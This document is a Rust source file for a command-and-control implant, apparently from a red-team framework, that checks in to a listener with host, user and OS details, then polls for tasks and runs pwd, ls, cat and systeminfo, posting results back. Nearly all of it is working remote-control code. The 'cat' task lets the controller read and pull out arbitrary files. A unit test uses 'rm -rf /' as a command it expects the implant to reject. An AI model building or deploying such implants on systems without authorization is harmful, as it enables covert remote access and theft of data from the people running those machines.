use clap::Parser;
use reqwest::Client;
use std::error::Error;
use std::{
    net::UdpSocket,
    time::{Duration, SystemTime},
};
use tokio::time::sleep;
use uuid::Uuid;

use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
use rb::task::{Task, TaskResult, TaskStatus};

/// CLI arguments for the implant
#[derive(Parser, Debug, Clone)]
pub struct Args {
    /// C2 listener host (default: localhost)
    #[clap(long, default_value = "localhost")]
    pub host: String,

    /// C2 listener port (default: 8080)
    #[clap(short, long, default_value = "8080")]
    pub port: u16,

    /// Poll interval in seconds (default: 5)
    #[clap(long, default_value = "5")]
    pub interval: u64,
}

/// Main entrypoint for the implant logic.
pub async fn run_implant() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    run_implant_with_args(args).await
}

/// Runs the implant with explicitly provided arguments
/// This allows the payload to hardcode values without CLI parsing
pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
    // Build base URL
    let base_url = format!("http://{}:{}", args.host, args.port);

    // Create HTTP client
    let client = Client::new();

    // Derive local IP by opening a UDP socket
    let ip_address = match get_local_ip(&args.host, args.port) {
        Ok(ip) => ip,
        Err(_) => "unknown".to_string(), // Fallback if IP resolution fails
    };

    // Prepare and send the check-in payload
    let checkin = ImplantCheckin {
        id: None,
        hostname: whoami::fallible::hostname().unwrap_or_default(),
        ip_address,
        os_info: whoami::distro(),
        username: whoami::username(),
        process_id: std::process::id(),
    };

    let resp = client
        .post(&format!("{}/checkin", base_url))
        .json(&checkin)
        .send()
        .await?;

    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Check-in failed ({}): {}", status, body).into());
    }
    let data: CheckinResponse = resp.json().await?;
    let implant_id = data.implant_id;
    println!("Checked in. Implant ID: {}", implant_id);

    // Poll-execute-report loop
    loop {
        // Fetch tasks for this implant
        let tasks_resp = match client
            .get(&format!("{}/tasks/{}", base_url, implant_id))
            .send()
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                eprintln!("Failed to fetch tasks: {}", e);
                sleep(Duration::from_secs(args.interval)).await;
                continue;
            }
        };

        let tasks: Vec<Task> = tasks_resp.json().await.unwrap_or_else(|_| {
            eprintln!("Failed to parse tasks response");
            Vec::new()
        });

        for task in tasks {
            println!("Executing command: {}", task.command);

            let task_result = run_command(&task, implant_id);

            // Post the result back
            if let Err(e) = client
                .post(&format!("{}/results", base_url))
                .json(&task_result)
                .send()
                .await
            {
                eprintln!("Failed to submit results: {}", e);
            }
        }

        // Wait before the next poll
        sleep(Duration::from_secs(args.interval)).await;
    }
}

fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn Error>> {
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.connect((target_host, target_port))?;
    Ok(socket.local_addr()?.ip().to_string())
}

/// Dispatch a task to the native command implementation and build its result.
pub fn run_command(task: &Task, implant_id: Uuid) -> TaskResult {
    let now = SystemTime::now();

    let result = match task.command.as_str() {
        "pwd" => cmd_pwd(&task.args),
        "ls" => cmd_ls(&task.args),
        "cat" => cmd_cat(&task.args),
        "systeminfo" => cmd_systeminfo(&task.args),
        other => Err(format!(
            "Unknown command '{}'. Supported commands: pwd, ls, cat, systeminfo",
            other
        )),
    };

    match result {
        Ok(output) => TaskResult {
            task_id: task.id,
            implant_id,
            session_id: task.session_id,
            output,
            error: None,
            status_code: Some(0),
            status: TaskStatus::Completed,
            completed_at: now,
        },
        Err(error) => TaskResult {
            task_id: task.id,
            implant_id,
            session_id: task.session_id,
            output: CommandOutput::None,
            error: Some(error),
            status_code: Some(1),
            status: TaskStatus::Failed,
            completed_at: now,
        },
    }
}

fn cmd_pwd(_args: &[String]) -> Result<CommandOutput, String> {
    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
    Ok(CommandOutput::Text(cwd.display().to_string()))
}

fn cmd_ls(args: &[String]) -> Result<CommandOutput, String> {
    let path = args.first().map(String::as_str).unwrap_or(".");
    let entries = std::fs::read_dir(path).map_err(|e| format!("{}: {}", path, e))?;

    let headers = ["Name", "Type", "Size", "Modified"]
        .iter()
        .map(|s| s.to_string())
        .collect();

    let mut rows: Vec<Vec<String>> = Vec::new();
    for entry in entries {
        let entry = entry.map_err(|e| e.to_string())?;
        let metadata = entry.metadata().ok();
        let kind = match &metadata {
            Some(m) if m.is_dir() => "dir",
            _ => "file",
        };
        let size = metadata
            .as_ref()
            .map(|m| m.len().to_string())
            .unwrap_or_default();
        let modified = metadata
            .as_ref()
            .and_then(|m| m.modified().ok())
            .map(format_time)
            .unwrap_or_default();

        rows.push(vec![
            entry.file_name().to_string_lossy().to_string(),
            kind.to_string(),
            size,
            modified,
        ]);
    }
    rows.sort_by(|a, b| a[0].cmp(&b[0]));

    Ok(CommandOutput::Table { headers, rows })
}

fn cmd_cat(args: &[String]) -> Result<CommandOutput, String> {
    let path = args
        .first()
        .ok_or_else(|| "usage: cat <file>".to_string())?;
    let contents = std::fs::read_to_string(path).map_err(|e| format!("{}: {}", path, e))?;
    Ok(CommandOutput::Text(contents))
}

fn cmd_systeminfo(_args: &[String]) -> Result<CommandOutput, String> {
    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    Ok(CommandOutput::Json(serde_json::json!({
        "hostname": whoami::fallible::hostname().unwrap_or_default(),
        "username": whoami::username(),
        "os": whoami::distro(),
        "arch": std::env::consts::ARCH,
        "pid": std::process::id(),
        "cwd": cwd,
    })))
}

fn format_time(time: SystemTime) -> String {
    match time.duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_secs().to_string(),
        Err(_) => "unknown".to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn task(command: &str, args: &[&str]) -> Task {
        Task {
            id: Uuid::new_v4(),
            implant_id: Uuid::new_v4(),
            session_id: 0,
            command: command.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            created_at: SystemTime::now(),
            status: TaskStatus::Pending,
        }
    }

    #[test]
    fn pwd_returns_a_path() {
        match cmd_pwd(&[]).unwrap() {
            CommandOutput::Text(text) => assert!(!text.is_empty()),
            _ => panic!("expected text output"),
        }
    }

    #[test]
    fn ls_lists_a_known_file() {
        let dir = std::env::temp_dir().join(format!("rb_ls_{}", Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("marker.txt"), b"hi").unwrap();

        match cmd_ls(&[dir.display().to_string()]).unwrap() {
            CommandOutput::Table { rows, .. } => {
                assert!(rows.iter().any(|row| row[0] == "marker.txt"));
            }
            _ => panic!("expected table output"),
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn cat_reads_a_file() {
        let file = std::env::temp_dir().join(format!("rb_cat_{}.txt", Uuid::new_v4()));
        std::fs::write(&file, "hello implant").unwrap();

        match cmd_cat(&[file.display().to_string()]).unwrap() {
            CommandOutput::Text(text) => assert_eq!(text, "hello implant"),
            _ => panic!("expected text output"),
        }

        let _ = std::fs::remove_file(&file);
    }

    #[test]
    fn known_command_completes() {
        let task = task("systeminfo", &[]);
        let result = run_command(&task, task.implant_id);
        assert_eq!(result.status, TaskStatus::Completed);
    }

    #[test]
    fn unknown_command_fails() {
        let task = task("rm", &["-rf", "/"]);
        let result = run_command(&task, task.implant_id);
        assert_eq!(result.status, TaskStatus::Failed);
        assert!(result
            .error
            .unwrap_or_default()
            .contains("Unknown command"));
    }
}
